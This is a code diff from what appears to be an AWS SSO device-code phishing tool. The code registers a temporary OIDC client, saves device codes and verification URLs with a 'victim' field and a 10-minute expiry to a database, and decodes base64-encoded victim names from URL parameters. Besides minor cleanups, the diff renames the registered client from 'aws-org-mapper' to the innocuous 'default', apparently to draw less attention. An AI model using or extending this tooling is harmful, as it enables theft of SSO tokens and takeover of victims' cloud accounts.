@@ -10,7 +10,7 @@ from decimal import Decimal
 def create_oidc_application(sso_oidc_client):
     print("Creating temporary AWS SSO OIDC application")
     client = sso_oidc_client.register_client(
-        clientName='aws-org-mapper',
+        clientName='default',
         clientType='public'
     )
     client_id = client.get('clientId')
@@ -49,18 +49,17 @@ def save_to_db(url, deviceCode, oidc_application, victim=""):
         'oidc_app': oidc_application,
         'token': '',
         'urlExpires': Decimal(time.time() + 600),
-        'victim':victim
+        'victim': victim
     }
 
     table.put_item(
-    Item=data
+        Item=data
     )
 
     return data
 
 def decode_victim_name(url_paramater):
-    base64_message = str(url_paramater)
-    base64_bytes = base64_message.encode('ascii')
+    base64_bytes = url_paramater.encode('ascii')
     message_bytes = base64.b64decode(base64_bytes)
     message = message_bytes.decode('ascii')
     return message
